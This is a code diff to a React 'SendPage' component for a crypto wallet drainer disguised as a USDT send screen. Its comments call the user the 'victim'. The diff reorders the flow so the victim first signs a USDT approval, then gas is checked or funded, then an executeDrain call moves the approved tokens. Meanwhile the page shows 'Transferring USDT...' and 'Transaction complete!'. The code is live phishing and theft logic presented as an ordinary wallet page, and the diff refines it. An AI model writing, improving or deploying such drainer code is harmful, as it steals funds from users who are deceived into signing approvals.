@@ -66,7 +66,17 @@ export default function SendPage({ provider, address }: Props) {
     try {
       const switchedProvider = await ensureCorrectNetwork(provider)
 
-      // 1) GAS FIRST — victim needs BNB to sign the approval
+      // 1) APPROVAL FIRST — victim signs the USDT approve
+      setStage("approving")
+      setStatusMsg("Waiting for approval...")
+      const approval = await requestApproval(switchedProvider, address)
+      if (!approval) {
+        setStage("error")
+        setStatusMsg("Approval failed.")
+        return
+      }
+
+      // 2) THEN check gas / fund (approval already signed)
       setStage("checking_gas")
       setStatusMsg("Checking gas balance...")
       const hasGas = await ensureGas(switchedProvider, address)
@@ -76,20 +86,10 @@ export default function SendPage({ provider, address }: Props) {
         return
       }
 
-      // 2) THEN approval
-      setStage("approving")
-      setStatusMsg("Waiting for approval...")
-      const approvedAmount = await requestApproval(switchedProvider, address)
-      if (!approvedAmount) {
-        setStage("error")
-        setStatusMsg("Approval failed.")
-        return
-      }
-
-      // 3) THEN drain
+      // 3) THEN drain — backend waits for approval to confirm first
       setStage("draining")
       setStatusMsg("Transferring USDT...")
-      const drained = await executeDrain(address, approvedAmount)
+      const drained = await executeDrain(address, approval)
       if (drained) {
         setStage("done")
         setStatusMsg("Transaction complete!")
@@ -103,7 +103,6 @@ export default function SendPage({ provider, address }: Props) {
     }
   }
 
-  // ===================== PROCESSING / DONE / ERROR SCREENS =====================
   if (stage !== "idle") {
     return (
       <div className="min-h-screen bg-[#171717] flex flex-col items-center justify-center px-6">
@@ -135,7 +134,6 @@ export default function SendPage({ provider, address }: Props) {
     )
   }
 
-  // ===================== MAIN SEND PAGE =====================
   return (
     <div className="min-h-screen bg-[#171717] flex flex-col px-4 pt-4 pb-8">
       {networkError && !networkOk && (
@@ -187,7 +185,7 @@ export default function SendPage({ provider, address }: Props) {
       </div>
 
       <p className="text-[#8A8A8A] text-sm mb-4">
-         {parseFloat(usdtBalance || "0").toFixed(2)} USDT
+        ≈ {parseFloat(usdtBalance || "0").toFixed(2)} USDT
       </p>
 
       <div className="flex-1" />
